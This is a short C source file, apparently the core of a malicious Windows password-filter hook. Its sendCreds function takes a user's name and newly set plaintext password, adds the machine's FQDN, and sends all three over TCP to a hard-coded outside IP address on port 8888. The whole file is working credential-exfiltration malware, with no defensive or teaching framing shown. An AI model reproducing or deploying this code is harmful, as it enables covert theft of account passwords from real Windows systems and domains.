#define DEST_IP "100.102.255.70"
#define DEST_PORT 8888

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>

char * getFQDN(void)
{
	size_t len = 50;
	char * fqdn = calloc(len, sizeof(char));
	strncpy(fqdn, gethostbyname("")->h_name, len); 
	return fqdn;
}

void sendCreds(PUNICODE_STRING UserName, PUNICODE_STRING NewPassword)
{
	char username[50];
	char password[50];
	char * fqdn = getFQDN();
	char buffer[200];
	
	// convert username and password to normal string format
	wcstombs(username, UserName->Buffer, sizeof(username));
	wcstombs(password, NewPassword->Buffer, sizeof(password));
	// place all info into one buffer
	snprintf(buffer, 200, "%s\n%s\n%s", fqdn, username, password);
	
	// set up socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(DEST_IP);
	server.sin_port = htons(DEST_PORT);
	
	// connect to server and send buffer
	connect(s, (struct sockaddr *)&server, sizeof(server));
	send(s, buffer, sizeof(char)*strlen(buffer), 0);
	
	// close socket
	shutdown(s, SD_BOTH);
	free(fqdn);
}